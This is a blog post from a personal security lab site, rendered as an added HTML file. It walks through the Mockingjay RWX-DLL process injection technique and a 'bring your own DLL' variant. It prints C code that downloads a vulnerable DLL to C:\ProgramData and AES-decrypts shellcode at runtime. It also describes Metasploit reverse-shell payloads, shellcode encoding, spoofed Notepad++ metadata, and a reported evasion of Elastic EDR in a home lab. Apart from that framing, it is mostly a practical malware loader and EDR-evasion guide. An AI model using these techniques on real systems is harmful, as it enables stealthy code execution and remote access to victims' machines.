@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.1.0.745482474535">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.1.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Mockingjay - BYODLL</title>
+    <meta name="title" content="Mockingjay - BYODLL">
+    <meta name="description" content="In June 2023 cybersecurity researchers at Security Joes raised the alert for a new process injection technique called Mockingjay">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://caueb.github.io/purple-team-lab/mockingjay-byodll/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://caueb.github.io/purple-team-lab/mockingjay-byodll/">
+    <meta property="og:title" content="Mockingjay - BYODLL">
+    <meta property="og:description" content="In June 2023 cybersecurity researchers at Security Joes raised the alert for a new process injection technique called Mockingjay">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://caueb.github.io/purple-team-lab/mockingjay-byodll/">
+    <meta property="twitter:title" content="Mockingjay - BYODLL">
+    <meta property="twitter:description" content="In June 2023 cybersecurity researchers at Security Joes raised the alert for a new process injection technique called Mockingjay">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../resources/css/retype.css?v=3.1.0.745482474535" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.1.0.745482474535" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.1.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.1.0.745482474535" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.1.0.745482474535" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                        </g>
+                                    </svg>
+                                    <span>GitHub</span>
+                                </a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
+                                        </g>
+                                    </svg>
+                                    <span>HackTheBox</span>
+                                </a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                </g>
+                                            </svg>
+                                            <span>GitHub</span>
+                                        </a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
+                                                </g>
+                                            </svg>
+                                            <span>HackTheBox</span>
+                                        </a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="mockingjay---byodll" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#mockingjay---byodll">#</doc-anchor-trigger>
+        <span>Mockingjay - BYODLL</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="intro">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#intro">#</doc-anchor-trigger>
+        <span>Intro</span>
+    </h2>
+</doc-anchor-target>
+<p>In June 2023 cybersecurity researchers at Security Joes raised the alert for a <a href="https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution">new process injection technique called Mockingjay</a> which would be able to evade traditional EDR. The technique consist of abusing default RWX (Read-Write-Execute) sections in a DLL to execute arbitrary code on compromised systems. Security tools such as EDR will often place hooks and monitor for specific Windows APIs calls, or sometimes the combination of them, to decide if a process is malicious. For example, the most common APIs used for process injection are:
+| Windows API | Description |
+| ----------- | ----------- |
+| VirtualAlloc | This API is used to allocate memory within the process&#x27;s address space. In self-injection, it&#x27;s used to allocate memory to hold the payload. |
+| RtlMoveMemory | While not an official API, this is a memory copy operation used to copy the payload code into the allocated memory. |
+| VirtualProtect | This API is used to change the protection attributes of a memory region. It&#x27;s often used after allocating memory to make it executable, allowing the payload code to be executed. |
+| CreateThread | This API is used to create a new thread within the process. It&#x27;s often used to start the execution of the payload entry point. |</p>
+<p>One of the reasons why Mockingjay successfully evade EDR is that it can skip some of these common process injection steps, such as, allocating memory, changing memory permissions, and starting a new thread. This is because the legitimate loaded DLL already provide all that to the attacker.</p>
+<p>Loading DLLs with default RWX to execute code is not new to 2023, it has been used for multiple years in the game hacking community as we can see in <a href="https://www.unknowncheats.me/forum/2174119-post31.html">this post in the forum Unknown Cheats from 2018</a>.</p>
+<p>Based on my knowledge and research, there is no DLLs with a RWX section on a default Windows installation. You can use <a href="https://github.com/caueb/Mockingjay/blob/main/rwx_finder.py">this Python script</a> to check if there is any on yours.
+However, the research done by Security Joes found a vulnerable DLL on systems with Visual Studio 2022 Community installed at <code v-pre>C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\Team Explorer\Git\usr\bin\msys-2.0.dll.</code>
+This DLL have a RWX section of 16 KB in size, which is enough to store and execute a payload.<br />
+I was very curious to know how this works, so I created a proof-of-concept that loads the vulnerable DLL and self-inject shellcode: <a href="https://github.com/caueb/Mockingjay">https://github.com/caueb/Mockingjay</a></p>
+<p>All this sounds very interesting, however, this technique is limited to compromised systems that contain a vulnerable DLL. While I was wondering if threat actors may target developers now, as they are more likely to have Visual Studio installed, I thought “why not just bring the vulnerable DLL to the compromised machine?”. I decided to modify the code in my POC to download the DLL from the internet, write to disk, and then load the DLL from disk. It works, evaded Elastic EDR on full prevention mode.</p>
+<doc-anchor-target id="mockingjay---byodll-1">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#mockingjay---byodll-1">#</doc-anchor-trigger>
+        <span>Mockingjay - BYODLL</span>
+    </h2>
+</doc-anchor-target>
+<p>To test the detection of bringing your own vulnerable DLL I modified my POC and run against Elastic EDR in my home lab. You can read more about how I have my <a href="https://caueb.github.io/purple-team-lab/elasticonraspberrypi/">home lab setup here</a>.</p>
+<p>Basically I have the following setup:</p>
+<ul>
+<li>1 x Windows 11 fully updated with Elastic EDR agent (target).</li>
+<li>1 x Windows 11 fully updated (attacker).</li>
+<li>1 x Raspberry Pi 4 running Elastic on full prevention mode.</li>
+</ul>
+<p><em>Side note: I think Elastic do a fantastic job in detecting and preventing threats. The main reason I’m testing against it is the convenience of having a 30-day trial and the challenge to evade detection.</em></p>
+<doc-anchor-target id="download-the-dll--save-to-disk">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#download-the-dll--save-to-disk">#</doc-anchor-trigger>
+        <span>Download the DLL &amp; Save to disk</span>
+    </h3>
+</doc-anchor-target>
+<p>I created a function that will download the vulnerable DLL from a URL and write into disk. I opted to save it in the <code v-pre>C:\ProgramData\</code> folder, usually is a world writable location:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">BOOL GetDllFromUrl(const char* szUrl, const char* savePath) {
+    HINTERNET   hInternet       = NULL,
+                hInternetFile   = NULL;
+    DWORD       dwBytesRead     = NULL;
+
+    // Opening an internet session handle
+    hInternet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet == NULL) {
+        return FALSE;
+    }
+
+    // Opening a handle to the DLL's URL
+    hInternetFile = InternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, NULL);
+    if (hInternetFile == NULL) {
+        InternetCloseHandle(hInternet);
+        return FALSE;
+    }
+
+    // Open a local file for writing the payload
+    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        InternetCloseHandle(hInternet);
+        InternetCloseHandle(hInternetFile);
+        return FALSE;
+    }
+
+    // Reading the DLL bytes and writing to the local file
+    BYTE buffer[1024];
+    DWORD bytesRead;
+
+    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &amp;bytesRead) &amp;&amp; bytesRead &gt; 0) {
+        DWORD bytesWritten;
+        WriteFile(hFile, buffer, bytesRead, &amp;bytesWritten, NULL);
+    }
+    printf(&quot;\t[i] File saved to %s\n&quot;, savePath);
+
+    CloseHandle(hFile);
+
+    InternetCloseHandle(hInternet);
+    InternetCloseHandle(hInternetFile);
+    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+
+    return TRUE;
+}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="payload">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#payload">#</doc-anchor-trigger>
+        <span>Payload</span>
+    </h3>
+</doc-anchor-target>
+<p>Next, I generated a reverse shell shellcode using Metasploit msfvenom and then used the python script <a href="https://gist.github.com/caueb/6fa10a0c95fb2ac7b694771354822eff">bintoaes.py</a> to encrypt the shellcode using AES.
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img01.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The payload is going to be decrypted at runtime using this function (borrowed from reenz0h @SEKTOR7net) to avoid static detections on Metasploit shellcode:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+
+    if (!CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        return -1;
+    }
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash)) {
+        return -1;
+    }
+    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
+        return -1;
+    }
+    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &amp;hKey)) {
+        return -1;
+    }
+
+    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&amp;payload_len)) {
+        return -1;
+    }
+
+    CryptReleaseContext(hProv, 0);
+    CryptDestroyHash(hHash);
+    CryptDestroyKey(hKey);
+
+    return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>What I did not know was that whenever the EDR see the combination of the Windows APIs <code v-pre>CreateFileA</code> (to save the DLL to disk) with <code v-pre>CryptCreateHash</code>and <code v-pre>CryptHashData</code> (to decrypt the payload) would immediately flag my program as malicious since many ransomware use of the same.</p>
+<p>Decided to simplify things, instead of encrypting, lets just encode the shellcode, this way we do not load any of the Crypt* functions. I will be using IPV4 encoding, while there are many <a href="https://github.com/TheD1rkMtr/Shellcode-Hide/blob/main/2%20-%20Encoding/4%20-%20IPv4%20shellcode/IPfuscation/IPfuscation.cpp">examples on Github</a>, I will implement the one I learned from <a href="https://maldevacademy.com/">Maldev Academy</a> (Sorry, I can’t share this one).</p>
+<doc-anchor-target id="spoofing-metadata">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#spoofing-metadata">#</doc-anchor-trigger>
+        <span>Spoofing metadata</span>
+    </h3>
+</doc-anchor-target>
+<p>In order to make my executable less suspicious I removed the CRT library from the project and added spoofed metadata stolen from Notepad++.exe. By the way, I created a short PowerShell script to <a href="https://gist.github.com/caueb/eb0f49a90ca3532b3e04e6c65d7c2acd">extract the metadata from a binary here</a> if you are interested.
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img02.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Below is a comparison of our compiled malware(left) and Notepad++(right) executable metadata:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img03.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="execution-flow">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#execution-flow">#</doc-anchor-trigger>
+        <span>Execution flow</span>
+    </h3>
+</doc-anchor-target>
+<p>Let’s recap what our malware will be executing:</p>
+<ol>
+<li>Download the vulnerable DLL from the attacker machine and save to the target machine disk</li>
+<li>Load the downloaded vulnerable DLL into the process</li>
+<li>Map the RWX region of the loaded DLL</li>
+<li>Decode the Metasploit payload</li>
+<li>Write the payload into the RWX region</li>
+<li>Call the RWX region to execute the payload</li>
+</ol>
+<p>In the attacker machine, we will be hosting the compiled malware and the vulnerable DLL:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img04.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>In the target machine we can use curl to download the malware and then execute:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img05.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Elastic does a good job at detecting the Metasploit shellcode executed in memory, but we still get a reverse shell:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img06.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Checking the C:\ProgramData\ folder of the target machine revealed that the DLL was indeed downloaded there:
+<figure class="content-center">
+    <img src="../imgs/mockingjay/img07.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>This tells me that the detection is in the Metasploit shellcode we are using and not in the technique itself. The next logical step to bypass the detection is to create a custom shellcode instead of using Metasploit.</p>
+<p>I will not get into details how to create one as this post would get too long, but if you are interested, here are a few resources:</p>
+<ul>
